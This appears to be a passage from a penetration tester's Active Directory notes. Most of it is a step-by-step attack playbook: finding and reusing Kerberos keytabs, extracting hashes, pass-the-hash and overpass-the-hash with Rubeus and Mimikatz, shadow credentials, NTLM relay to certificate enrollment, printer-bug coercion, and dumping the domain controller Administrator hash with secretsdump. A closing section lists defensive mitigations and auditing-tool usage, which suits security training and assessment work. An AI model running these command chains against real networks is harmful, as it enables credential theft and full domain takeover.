- Keytabs: https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro
    - Machine: `/etc/krb5.keytab`

```bash
klist
# Backup current keytab
cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) KEYTAB.BAK
# Use current keytab
export KRB5CCNAME=KEYTAB.BAK
```

```bash
# Enumerate AD information
# https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd
realm list

# Check for AD
grep -i "sss\|winbind\|ldap" /etc/nsswitch.conf
ps -ef | grep -i "winbind\|sssd"
env | grep -i krb5

# Find keytabs
sudo find / \( -iname '*keytab*' -o -iname '*.kt' \) -ls 2>/dev/null

# List cached Kerberos tickets
klist
# Backup current keytab
cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) current.kt.bak
# Use current keytab
export KRB5CCNAME=$(pwd)/current.kt.bak

# Extract hashes from keytab files
# https://github.com/sosdave/KeyTabExtract
python3 keytabextract.py <KEYTAB_FILE>

# Use keytab
# NOTE: not all cached keytabs are valid
ls -la /tmp/krb5cc*
cp -v <KEYTAB> $HOME/current.kt.bak
export KRB5CCNAME=$HOME/current.kt.bak

# Show keytabs
klist
# Use keytab
kinit -k '<NAME>'

smbclient //<TARGET>/C$ -k -no-pass -c 'ls'
```

## Double Hop Problem

There's an issue known as the "Double Hop" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. **Kerberos tickets should not be viewed as passwords**. They are signed pieces of data from the KDC that state what resources an account can access (e.g. a computer but not beyond that computer). When we perform Kerberos authentication, we get a "ticket" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.

### Enumeration of the Problem

Use these commands to confirm you are in a "Double Hop" / Network Logon state where delegation is failing.

| Command | Output Indicator | Meaning |
| :------ | :--------------- | :------ |
| `klist` | Missing `krbtgt/DOMAIN` | You have no TGT. You cannot request tickets for other servers. |
| `klist` | Present `HTTP/Hostname` | You only have a service ticket for the current box. |
| `mimikatz` | `Password : (null)` | LSASS has no cached credentials for your session. |
| `dir \\DC01\C$` | `Access is denied` / `Anonymous Logon` | The target sees you as "Anonymous" because no creds were forwarded. |

### Mitigation Methods

#### Method 1: Pass Credential Object (Handout / Native)

Best for "Living off the Land" without uploading tools. Requires knowing the plaintext password.

```powershell
# 1. Create the Credential Object
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $pass)

# 2. Execute command on the 2nd Hop using the Credential
Invoke-Command -ComputerName <MACHINE_NAME> -Credential $cred -ScriptBlock { Get-Process }

# 3. Or enter an interactive session
Enter-PSSession -ComputerName <MACHINE_NAME> -Credential $cred
```

#### Method 2: Register PSSession Configuration (Admin)

Requires Admin on the Jump Box. Sets up a permanent endpoint that auto-authenticates.

```powershell
# 1. Register the Session (On Jump Box)
Register-PSSessionConfiguration -Name "<SESSION_NAME>" -RunAsCredential "<DOMAIN>\<USER>" -Force

# 2. Connect to it (From Attack/Start Box)
Enter-PSSession -ComputerName <MACHINE_NAME> -ConfigurationName "<SESSION_NAME>"

# 3. Verify
klist # You should now see the krbtgt ticket
```

#### Method 3: Rubeus / Overpass-the-Hash (Attacker / Modern)

Best if you have a Hash or AES Key. Injects a TGT into your current session, "fixing" the double hop instantly.

```powershell
# 1. Inject a TGT using the hash (or AES key)
.\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt

# 2. Verify
klist # You now have a krbtgt ticket

# 3. Pivot
ls \\<DC_NAME>\C$ # Works natively now
```

#### Method 4: Mimikatz PtH (Legacy / Risky in WinRM)

Mimikatz usually spawns a new window (which fails in WinRM). You must force it to run a command in the same console.

```powershell
# /run:powershell might hang WinRM depending on the shell stability.
# Use Rubeus (Method 3) if possible.
mimikatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell" exit
```

## Pass the Certificate (PtC)

**Shadow Credentials Attack:**
```bash
# https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/
# https://github.com/ShutdownRepo/pywhisker.git
git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker && pip3 install -r requirements.txt && cd pywhisker

# Get Certificate for user
python3 pywhisker.py --dc-ip <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --target <NEW_USER> --action add
# creates .pfx file of <NEW_USER> and PFX password
```

```bash
# Intercept web enrollment requests
# https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
# NOTE: use https://github.com/ly4k/Certipy to find other templates
python3 -m venv venv
pip install git+https://github.com/fortra/impacket.git
hash -r
venv/bin/ntlmrelayx.py --adcs -smb2support --template KerberosAuthentication -t <WEB_ENROLL_SERVER>
# outputs *.pfx file

# Force arbitrary auth from <TARGET> to <ATTACKER> via printers
# e.g. DC => ATTACKER BOX
# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
wget https://github.com/dirkjanm/krbrelayx/raw/refs/heads/master/printerbug.py
python3 printerbug.py <DOMAIN>/<USERNAME>:"<PASSWORD>"@<TARGET> <ATTACKER>

# PtC to get TGT
# https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
git clone https://github.com/dirkjanm/PKINITtools.git ; cd PKINITtools ; python3 -m venv .venv ; source .venv/bin/activate ; pip3 install -r requirements.txt ; pip3 install -I git+https://github.com/wbond/oscrypto.git

# OPTIONAL: -pfx-pass from pywhisker.py
python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS> -dc-ip <DC_IP> '<DOMAIN>/<USER>' <OUTPUT_TGT>
# gives <OUTPUT_TGT>

---

# Configure Kerberos
echo '<DC_IP> <DC_FQDN>' | sudo tee -a /etc/hosts
sudo cp -v /etc/krb5.conf /etc/krb5.conf.bak
echo '[libdefaults]
    default_realm = <DOMAIN>
    dns_lookup_kdc = false
[realms]
    <DOMAIN> = {
        kdc = <DC_FQDN>
    }
[domain_realm]
    .<DOMAIN_LOWER> = <DOMAIN_UPPER>
    <DOMAIN_LOWER> = <DOMAIN_UPPER>
' | sudo tee /etc/krb5.conf

export KRB5CCNAME=<OUTPUT_TGT>
klist
# Get NTLM hash of DC Administrator
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/<DC_HOSTNAME>$'@<TARGET_FQDN>
# gives HASH

evil-winrm ... -H <HASH>
```

# Mitigation

## Inventory

- `Naming conventions of OUs, computers, users, groups`
- `DNS, network, and DHCP configurations`
- `An intimate understanding of all GPOs and the objects that they are applied to`
- `Assignment of FSMO roles`
- `Full and current application inventory`
- `A list of all enterprise hosts and their location`
- `Any trust relationships we have with other domains or outside entities`
- `Users who have elevated permissions`

## Prevention

### Technology

- Run tools such as 5d, PingCastle, and Grouper periodically to identify AD misconfigurations.
- Ensure that administrators are not storing passwords in the AD account description field.
- Review SYSVOL for scripts containing passwords and other sensitive data.
- Avoid the use of "normal" service accounts, utilizing Group Managed (gMSA) and Managed Service Accounts (MSA) where ever possible to mitigate the risk of Kerberoasting.
- Disable Unconstrained Delegation wherever possible.
- Prevent direct access to Domain Controllers through the use of hardened jump hosts.
- Consider setting the `ms-DS-MachineAccountQuota` attribute to `0`, which disallows users from adding machine accounts and can prevent several attacks such as the noPac attack and Resource-Based Constrained Delegation (RBCD)
- Disable the print spooler service wherever possible to prevent several attacks
- Disable NTLM authentication for Domain Controllers if possible
- Use Extended Protection for Authentication along with enabling Require SSL only to allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- Enable SMB signing and LDAP signing
- Take steps to prevent enumeration with tools like BloodHound
- Ideally, perform quarterly penetration tests/AD security assessments, but if budget constraints exist, these should be performed annually at the very least.
- Test backups for validity and review/practice disaster recovery plans.
- Enable the restriction of anonymous access and prevent null session enumeration by setting the `RestrictNullSessAccess` registry key to `1` to restrict null session access to unauthenticated users.

### People

- The organization should have a strong password policy, with a password filter that disallows the use of common words (i.e., welcome, password, names of months/days/seasons, and the company name). If possible, an enterprise password manager should be used to assist users with choosing and using complex passwords.
- Rotate passwords periodically for **all** service accounts.
- Disallow local administrator access on user workstations unless a specific business need exists.
- Disable the default `RID-500 local admin` account and create a new admin account for administration subject to LAPS password rotation.
- Implement split tiers of administration for administrative users. Too often, during an assessment, you will gain access to Domain Administrator credentials on a computer that an administrator uses for all work activities.
- Clean up privileged groups. `Does the organization need 50+ Domain/Enterprise Admins?` Restrict group membership in highly privileged groups to only those users who require this access to perform their day-to-day system administrator duties.
- Disable Kerberos delegation for administrative accounts (the Protected Users group may not do this)
- Where appropriate, place accounts in the `Protected Users` group.
    - https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

```powershell
# Viewing the Protected Users Group (ADSI)
$root = [ADSI]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext.Value
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$defaultNC")
$searcher.Filter = "(&(objectCategory=group)(samAccountName=Protected Users))"
$searcher.PropertiesToLoad.Add("name") | Out-Null
$searcher.PropertiesToLoad.Add("description") | Out-Null
$searcher.PropertiesToLoad.Add("member") | Out-Null
$searcher.FindOne() | ForEach-Object { $_.Properties }
```

# Reporting and Auditing

### PingCastle

**Role:** Generates a "Health Check" report based on a maturity model. Bridges the gap between technical findings and C-Level risk scores.
**OPSEC:** Moderate. Generates significant LDAP traffic but looks like admin activity.

```cmd
# Interactive Mode (Best for first run)
PingCastle.exe

# Healthcheck Report (Non-Interactive)
# Generates an HTML report in the current directory
PingCastle.exe --healthcheck --server <DC_FQDN>

# Scan specific risk areas (Scanner Mode)
# Options: aclcheck, antivirus, localadmin, laps_bitlocker, etc.
PingCastle.exe --scanner aclcheck
```

### Active Directory Explorer (Sysinternals)

**Role:** Creates (and mounts) snapshots of the AD Database for offline analysis.
**Attack Vector:** If you find `.dat` snapshot files on shares, you can mount them to browse AD as it was at that time *without* alerting the DC.

```cmd
# Create a Snapshot (Requires Creds)
# -snapshot: Create a snapshot
# "" : Prompt for password
ADExplorer.exe -snapshot "" <DC_FQDN> output_filename

# Mount a Snapshot (Offline Analysis)
# Allows you to browse a .dat file found on a share
ADExplorer.exe -snapshot "" <PATH_TO_DAT_FILE>
```

### Group3r

**Role:** Deep-dive auditing of **Group Policy Objects (GPOs)**. Unlike standard tools that check permissions, this parses the *content* of GPOs to find hardcoded passwords, local admin deployments, and script definitions.

```cmd
# Basic Scan (Output to Console)
group3r.exe -s

# Full Scan (Output to File)
# -f: Output file path
group3r.exe -f results.log
```

### ADRecon

**Role:** Extracts *everything* from the domain (Users, Computers, GPOs, DNS, LAPS, BitLocker) and compiles it into a massive Excel report.
**OPSEC:** 💀 **EXTREMELY LOUD.** Do not use during a Red Team engagement unless you have burned the environment or are simulating an "Ignorant Insider."

```powershell
# Run Audit (Requires Excel installed for pretty reports, otherwise CSV)
.\ADRecon.ps1

# Run on specific target Domain Controller
.\ADRecon.ps1 -DomainController <DC_IP>

# Generate Excel report from CSVs (Run offline on analyst machine)
.\ADRecon.ps1 -GenExcel <PATH_TO_CSV_FOLDER>
```